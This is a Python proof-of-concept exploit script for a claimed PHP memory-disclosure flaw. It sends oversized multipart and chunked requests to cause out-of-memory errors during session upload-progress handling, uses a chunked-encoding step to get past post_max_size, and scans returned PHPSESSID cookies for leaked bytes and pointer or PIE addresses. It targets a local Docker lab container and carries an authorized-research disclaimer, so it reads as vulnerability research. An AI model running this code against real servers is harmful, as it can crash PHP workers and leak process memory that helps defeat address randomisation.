#!/usr/bin/env python3
"""
CVE-2026-109618 -- PHPSESSID memory disclosure test

When OOM hits during multipart parsing with session.upload_progress active,
freed worker memory may leak back inside the PHPSESSID response cookie.

This script sends OOM-triggering requests and inspects every Set-Cookie
header for anomalous PHPSESSID values (non-alphanumeric bytes, unusual
length, binary content).

For authorized security research and local lab use only.
"""

import socket
import sys
import time
import hashlib


def make_part(boundary, name, body, filename=None):
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


def build_oom_request(session_id, boundary, field_count, field_size):
    body = b""
    body += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"leak_test") + b"\r\n"
    body += make_part(boundary, "f", b"A" * 1024, filename="test.bin") + b"\r\n"
    for i in range(field_count):
        body += make_part(boundary, f"pad{i}", b"X" * field_size) + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return body


def build_chunked_oom_request(session_id, boundary, chunk_count, chunk_size):
    """Use chunked transfer encoding to bypass post_max_size."""
    parts = b""
    parts += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"leak_test") + b"\r\n"
    parts += make_part(boundary, "f", b"A" * 1024, filename="test.bin") + b"\r\n"
    for i in range(chunk_count):
        parts += make_part(boundary, f"pad{i}", b"X" * chunk_size) + b"\r\n"
    parts += b"--" + boundary + b"--\r\n"

    chunked_body = b""
    offset = 0
    cs = 65536
    while offset < len(parts):
        chunk = parts[offset:offset + cs]
        chunked_body += f"{len(chunk):x}\r\n".encode() + chunk + b"\r\n"
        offset += cs
    chunked_body += b"0\r\n\r\n"
    return chunked_body


def send_and_analyze(host, port, path, session_id, boundary, body,
                     chunked=False, label=""):
    if chunked:
        headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Cookie: PHPSESSID={session_id}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
    else:
        headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Cookie: PHPSESSID={session_id}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(30)
    try:
        sock.connect((host, port))
        sock.sendall(headers + body)
        resp = b""
        while True:
            try:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        sock.close()
    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        print(f"  [{label}] Connection error: {e}")
        return

    if not resp:
        print(f"  [{label}] Empty response (worker crash)")
        return

    status_line = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    print(f"  [{label}] {status_line}")

    # Extract all headers
    header_end = resp.find(b"\r\n\r\n")
    if header_end < 0:
        print(f"  [{label}] No header/body boundary found")
        return
    raw_headers = resp[:header_end]
    raw_body = resp[header_end + 4:]

    # Check for OOM in body
    if b"Allowed memory size" in raw_body:
        idx = raw_body.find(b"Allowed memory size")
        oom_msg = raw_body[idx:idx + 150].decode("latin-1", "replace")
        print(f"  [{label}] OOM confirmed: {oom_msg[:100]}")

    # Inspect ALL Set-Cookie headers
    cookies_found = 0
    for line in raw_headers.split(b"\r\n"):
        lower = line.lower()
        if not lower.startswith(b"set-cookie:"):
            continue
        cookies_found += 1
        cookie_val = line.split(b":", 1)[1].strip()
        print(f"  [{label}] Set-Cookie: {cookie_val[:200].decode('latin-1', 'replace')}")

        # Check for PHPSESSID specifically
        if b"PHPSESSID=" in line:
            sessid = line.split(b"PHPSESSID=")[1].split(b";")[0]
            sessid_len = len(sessid)

            # Normal PHPSESSID is 26 chars, all alphanumeric + comma
            is_normal_len = 20 <= sessid_len <= 40
            non_alnum = sum(1 for b in sessid if b not in
                           b"abcdefghijklmnopqrstuvwxyz0123456789,-")
            has_binary = any(b < 0x20 or b > 0x7e for b in sessid)
            has_nulls = b"\x00" in sessid

            if not is_normal_len or non_alnum > 0 or has_binary:
                print(f"  [{label}] *** ANOMALOUS PHPSESSID ***")
                print(f"    Length: {sessid_len} (normal: 26)")
                print(f"    Non-alnum bytes: {non_alnum}")
                print(f"    Has binary: {has_binary}")
                print(f"    Has nulls: {has_nulls}")
                print(f"    Raw hex (first 80): {sessid[:80].hex()}")
                print(f"    Raw ascii: {sessid[:80].decode('latin-1', 'replace')}")

                # Check for pointer-like values (8-byte aligned addresses)
                for i in range(0, min(len(sessid), 200) - 7):
                    val = int.from_bytes(sessid[i:i+8], 'little')
                    if 0x7f0000000000 <= val <= 0x7fffffffffff:
                        print(f"    Possible pointer at offset {i}: {hex(val)}")
                    if 0x550000000000 <= val <= 0x55ffffffffffff:
                        print(f"    Possible PIE addr at offset {i}: {hex(val)}")
            else:
                print(f"  [{label}] PHPSESSID normal ({sessid_len} chars): "
                      f"{sessid.decode('latin-1', 'replace')}")

    if cookies_found == 0:
        print(f"  [{label}] No Set-Cookie headers in response")

    # Also check if session_id we sent was echoed back differently
    if session_id.encode() not in resp and b"PHPSESSID=" in raw_headers:
        print(f"  [{label}] Note: sent sid '{session_id}' but got different one back")

    # Check body size
    print(f"  [{label}] Body: {len(raw_body)} bytes")
    print()


def main():
    host = "127.0.0.1"
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8896
    path = "/index.php"
    boundary = b"php2shell618"

    print("=" * 60)
    print("CVE-2026-109618: PHPSESSID Memory Disclosure Test")
    print("=" * 60)
    print(f"Target: http://{host}:{port}{path}")
    print()

    # Test 1: Normal request (baseline - no OOM)
    print("[Test 1] Baseline -- small request, no OOM expected")
    body = build_oom_request("baseline-test", boundary, 2, 64)
    send_and_analyze(host, port, path, "baseline-test", boundary, body,
                     label="baseline")

    # Test 2: OOM with Content-Length (standard approach)
    print("[Test 2] OOM via large fields (Content-Length)")
    for i in range(5):
        sid = f"leak-cl-{i}"
        body = build_oom_request(sid, boundary, 300, 65536)
        send_and_analyze(host, port, path, sid, boundary, body,
                         label=f"CL-{i}")
        time.sleep(0.3)

    # Test 3: OOM with chunked transfer encoding (post_max_size bypass)
    print("[Test 3] OOM via chunked transfer encoding")
    for i in range(5):
        sid = f"leak-chunk-{i}"
        body = build_chunked_oom_request(sid, boundary, 300, 65536)
        send_and_analyze(host, port, path, sid, boundary, body,
                         chunked=True, label=f"chunked-{i}")
        time.sleep(0.3)

    # Test 4: Repeated OOM to same session (accumulate corrupted state)
    print("[Test 4] Repeated OOM to same session ID")
    fixed_sid = "leak-repeat"
    for i in range(10):
        body = build_oom_request(fixed_sid, boundary, 300, 65536)
        send_and_analyze(host, port, path, fixed_sid, boundary, body,
                         label=f"repeat-{i}")
        time.sleep(0.2)

    # Test 5: Two-phase (stall for progress update, then OOM)
    print("[Test 5] Two-phase: progress update then OOM")
    for i in range(5):
        sid = f"leak-2phase-{i}"
        # Phase 1: small request activating progress
        seg1 = b""
        seg1 += make_part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"leak") + b"\r\n"
        seg1 += make_part(boundary, "f", b"", filename="up.bin") + b"\r\n"
        seg1 += b"A" * 4096

        # Phase 2: blast OOM fields
        seg2 = b""
        seg2 += b"B" * 2048 + b"\r\n"
        for j in range(300):
            seg2 += make_part(boundary, f"pad{j}", b"X" * 65536) + b"\r\n"
        seg2 += b"--" + boundary + b"--\r\n"

        total = len(seg1) + len(seg2)
        headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}:{port}\r\n"
            f"Cookie: PHPSESSID={sid}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
            f"Content-Length: {total}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(30)
        try:
            sock.connect((host, port))
            sock.sendall(headers + seg1)
            time.sleep(1.5)  # stall for progress update
            sock.sendall(seg2)

            resp = b""
            while True:
                try:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    resp += chunk
                except socket.timeout:
                    break
            sock.close()
        except Exception as e:
            print(f"  [2phase-{i}] Error: {e}")
            try:
                sock.close()
            except Exception:
                pass
            continue

        if not resp:
            print(f"  [2phase-{i}] Empty response")
            continue

        status_line = resp.split(b"\r\n", 1)[0].decode("latin-1", "replace")
        print(f"  [2phase-{i}] {status_line}")

        header_end = resp.find(b"\r\n\r\n")
        raw_headers = resp[:header_end] if header_end > 0 else resp
        raw_body = resp[header_end + 4:] if header_end > 0 else b""

        if b"Allowed memory size" in raw_body:
            print(f"  [2phase-{i}] OOM confirmed")

        for line in raw_headers.split(b"\r\n"):
            if b"PHPSESSID=" in line and line.lower().startswith(b"set-cookie:"):
                sessid = line.split(b"PHPSESSID=")[1].split(b";")[0]
                sessid_len = len(sessid)
                non_alnum = sum(1 for b in sessid if b not in
                               b"abcdefghijklmnopqrstuvwxyz0123456789,-")
                has_binary = any(b < 0x20 or b > 0x7e for b in sessid)
                if not (20 <= sessid_len <= 40) or non_alnum > 0 or has_binary:
                    print(f"  [2phase-{i}] *** ANOMALOUS PHPSESSID ***")
                    print(f"    Length: {sessid_len}, non-alnum: {non_alnum}")
                    print(f"    Hex: {sessid[:80].hex()}")
                else:
                    print(f"  [2phase-{i}] PHPSESSID normal: {sessid.decode('latin-1')}")
        print()

    print("Done. Check container logs:")
    print('  sg docker -c "docker logs modphp-vuln 2>&1 | tail -30"')


if __name__ == "__main__":
    main()
